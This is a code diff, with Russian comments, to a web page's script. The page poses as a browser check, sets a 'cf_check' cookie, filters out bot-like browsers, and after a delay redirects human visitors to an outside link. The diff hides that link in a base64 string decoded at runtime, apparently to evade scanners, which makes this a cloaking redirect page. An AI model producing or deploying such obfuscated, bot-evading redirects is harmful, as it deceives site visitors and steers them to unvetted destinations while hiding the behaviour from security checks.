@@ -42,7 +42,7 @@
   </div>
 
   <script>
-    // Устанавливаем тестовую куку
+    // Устанавливаем куку
     document.cookie = "cf_check=ok; path=/; SameSite=Lax";
 
     // Проверка наличия куки
@@ -57,10 +57,27 @@
              !navigator.language;
     }
 
-    // Основная логика
+    // Функция для декодирования base64
+    function decodeBase64(str) {
+      try {
+        return atob(str);
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // Зашифрованная ссылка
+    const encodedURL = "aHR0cHM6Ly9kdHJhZi5jb20vM3J4cmVk";
+
+    // Основная логика с задержкой
     setTimeout(function () {
       if (hasCookie("cf_check") && !isBot()) {
-        window.location.href = "https://dtraf.com/3rxred";
+        const decodedURL = decodeBase64(encodedURL);
+        if (decodedURL) {
+          window.location.href = decodedURL;
+        } else {
+          document.querySelector(".note").innerHTML = "❌ Redirection error. Please try again.";
+        }
       } else {
         document.querySelector(".note").innerHTML = "❌ Verification failed. Please refresh the page or try another browser.";
       }
